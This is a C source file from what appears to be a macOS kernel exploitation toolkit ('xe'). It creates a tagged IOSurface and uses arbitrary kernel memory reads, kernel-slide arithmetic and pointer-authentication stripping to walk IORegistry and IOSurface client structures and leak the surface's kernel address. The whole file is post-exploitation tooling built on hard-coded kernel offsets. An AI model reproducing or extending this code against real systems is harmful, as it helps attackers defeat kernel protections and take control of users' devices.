//
//  io_surface.c
//  xe
//
//  Created by admin on 12/6/21.
//

#include <stdatomic.h>

#include <sys/errno.h>

#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>

#include "memory/kmem.h"
#include "slider/kernel.h"
#include "iokit/io_surface.h"
#include "iokit/io_registry_entry.h"
#include "iokit/os_array.h"
#include "iokit/os_dictionary.h"
#include "util/assert.h"
#include "util/ptrauth.h"

#include "macos_params.h"


static _Atomic size_t xe_io_surface_keygen = 0;


IOSurfaceRef xe_io_surface_create(uintptr_t* addr_out) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(CFAllocatorGetDefault(), 2, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int alloc_size_raw_value = 8;
    CFNumberRef alloc_size_cfnum = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc_size_raw_value);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), alloc_size_cfnum);
    CFDictionarySetValue(props, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);

    IOSurfaceRef surface = IOSurfaceCreate(props);
    xe_assert(surface != NULL);
    CFRelease(alloc_size_cfnum);
    CFRelease(props);
    
    char key[NAME_MAX];
    snprintf(key, sizeof(key), "xe_io_surface_%d_%lu", getpid(), atomic_fetch_add(&xe_io_surface_keygen, 1));
    CFStringRef cf_key = CFStringCreateWithCString(kCFAllocatorDefault, key, kCFStringEncodingUTF8);
    xe_assert(cf_key != NULL);
    IOSurfaceSetValue(surface, cf_key, kCFBooleanTrue);
    CFRelease(cf_key);
    
    uintptr_t surface_addr;
    int error = xe_io_surface_scan_all_clients_for_prop(key, &surface_addr);
    xe_assert_err(error);
    
    *addr_out = surface_addr;
    return surface;
}


uintptr_t xe_io_surface_root(void) {
    uintptr_t io_registry_root = xe_io_registry_entry_root();

    uintptr_t pe_device;
    int error = xe_io_registry_entry_find_child_by_name(io_registry_root, "J316sAP", &pe_device);
    xe_assert_err(error);

    uintptr_t io_resources;
    error = xe_io_registry_entry_find_child_by_type(pe_device, xe_slider_kernel_slide(VAR_IO_RESOURCES_VTABLE + 0x10), &io_resources);
    xe_assert_err(error);

    uintptr_t io_surface_root;
    error = xe_io_registry_entry_find_child_by_name(io_resources, "IOSurfaceRoot", &io_surface_root);
    xe_assert_err(error);

    return io_surface_root;
}


int xe_io_surface_scan_user_client_for_prop(uintptr_t root_user_client, char* key, uintptr_t* out) {
    uint clients = xe_kmem_read_uint32(root_user_client, TYPE_IOSURFACE_ROOT_USER_CLIENT_MEM_CLIENT_COUNT_OFFSET);
    
    uintptr_t client_array_p = xe_kmem_read_uint64(root_user_client, TYPE_IOSURFACE_ROOT_USER_CLIENT_MEM_CLIENT_ARRAY_OFFSET);
    uintptr_t client_array[clients];
    xe_kmem_read(client_array, client_array_p, 0, sizeof(client_array));
    
    for (uint i=0; i<clients; i++) {
        uintptr_t user_client = client_array[i];
        if (!user_client) {
            continue;
        }
        
        uintptr_t surface = xe_kmem_read_uint64(xe_ptrauth_strip(user_client), TYPE_IOSURFACE_CLIENT_MEM_IOSURFACE_OFFSET);
        uintptr_t props_dict = xe_kmem_read_uint64(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET);
        
        if (!props_dict) {
            continue;
        }
        
        uintptr_t temp;
        int error = xe_os_dictionary_find_value(props_dict, key, &temp, NULL);
        if (!error) {
            *out = surface;
            return 0;
        }
    }
    
    return ENOENT;
}

int xe_io_surface_scan_all_clients_for_prop(char* key, uintptr_t* out) {
    uintptr_t root = xe_io_surface_root();

    uintptr_t registry = xe_io_registry_entry_registry_table(root);
    uintptr_t children;
    int error = xe_os_dictionary_find_value(registry, "IOServiceChildLinks", &children, NULL);
    xe_assert_err(error);

    for (int i=xe_os_array_count(children)-1; i>=0; i--) {
        uintptr_t target_surface = 0;
        error = xe_io_surface_scan_user_client_for_prop(xe_os_array_value_at_index(children, i), key, &target_surface);
        if (!error) {
            *out = target_surface;
            return 0;
        }
    }
    
    return ENOENT;
}
